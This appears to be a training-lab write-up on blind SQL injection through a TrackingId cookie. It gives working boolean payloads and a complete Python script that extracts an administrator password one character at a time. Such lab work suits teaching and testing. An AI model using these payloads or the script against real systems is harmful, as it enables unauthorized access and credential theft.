# 🧠 Lab Title: Blind SQL Injection with Conditional Responses

## 🔍 Category  
SQL Injection (SQLi)

## 🎯 Objective  
Log in as the administrator user.

## 🧰 Tools Used  
- Burpsuite

## 🚀 Exploitation Steps

### Observe the Description  
This lab is a bit tricky because it doesn’t return any errors, only a "Welcome back!" message. We know that the vulnerability lies in the `trackingid` cookie. We also know there is a column called `username`, a table called `users`, a username called `administrator`, and another column called `password`.

### Access the Lab  
> Click on **ACCESS THE LAB**.

### START HACKING!!!  
1) Let’s confirm the vulnerability with the following SQL injection (remember to delete the content of the tracking id; this will evaluate to false, so we inject with a true value):

```sql
' OR 1=1 --;
```

It worked!

2) Now, let’s first retrieve the content of the users table. Before that, let’s confirm that there is a table called `users`:

```sql
' OR (SELECT 'A' FROM users LIMIT 1)='A' --
```

Let's explain the payload:  
- **Why the brackets?** Because we want it to return true if there is a `users` table. We use `'A' = (SELECT 'A' FROM users LIMIT 1)` to check if the `users` table exists and has at least one row. If it does, it returns `'A' = 'A'`, which evaluates to true.  
- **What is LIMIT?** LIMIT is a clause used to control how many rows a query returns. Here, we use it to limit the results to 1 because we don’t know how many rows are in the table.

3) After verifying that there is a `users` table, let’s check if there is a username called `administrator`:

```sql
' OR (SELECT 'A' FROM users WHERE username='administrator' LIMIT 1) = 'A' --;
```

4) Great! Now we are getting somewhere. Let’s find out the length of the password:

```sql
' OR (SELECT 'A' FROM users WHERE username='administrator' AND LENGTH(password)=20) = 'A' -- ; 
```

We are basically saying: "Select letter A from users where the username is administrator and the length of the password is 20, and return 'A' if true."

5) Whew… It’s been a lot of work. Now let’s extract the password, but first, we should explain `SUBSTRING`.

**What is SUBSTRING?**  
- It's a function that lets you extract part of a string.

**Syntax:**

```sql
SUBSTRING(string, start_position, length)
```

| Part             | Meaning                          |
| ---------------- | --------------------------------|
| `string`         | The text you want to extract from|
| `start_position` | Where to start (1-based index)   |
| `length`         | How many characters to take      |

Our payload will look like this:

```sql
' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' --;
```

Explanation:  
We select one character at a time from the password using `SUBSTRING(password, pos, 1)` and compare it with a guess (`'a'`). If it's true, the page returns "Welcome back," telling us our guess is correct.

We will need to try all possible characters in the password. We have two options:  
- 1) Use Burp Suite Intruder.  
- 2) Script it in Python.

I chose the second option. Let’s start:

```python
import requests
import string

# === CONFIGURATION ===
TARGET_URL = ""  # Replace with your lab URL

# === Character set to use when guessing the password ===
CHARSET = string.ascii_lowercase + string.digits

# === Cookie name ===
INJECTION_COOKIE = "TrackingId"

# === Function to test each character ===
def test_character(position, character):
    # Create SQL injection payload
    payload = f"' OR (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{character}'--"
    
    # Set cookies
    cookies = {
        INJECTION_COOKIE: payload,
    }
    
    # Send the request
    response = requests.get(TARGET_URL, cookies=cookies)
    
    # If "Welcome back" is in the response, we found the right character
    return "Welcome back" in response.text

# === Main function to extract the password ===
def extract_password():
    print("[*] Starting blind SQLi password extraction...")
    password = ""

    for position in range(1, 21):  # Try up to 20 characters
        for char in CHARSET:
            print(f"[*] Trying position {position} with '{char}'...", end="\r")
            if test_character(position, char):
                password += char
                print(f"[+] Found character {position}: '{char}' => {password}")
                break
        else:
            print(f"[!] No valid character found at position {position}. Assuming end of password.")
            break

    print(f"\n[✓] Final extracted password for administrator: {password}")

# === Run the script ===
if __name__ == "__main__":
    extract_password()
```

And boom! You got the password.

## 🧵 Reflection  
- How do you perform a blind SQL injection?  
- How do you build a Python exploit script?
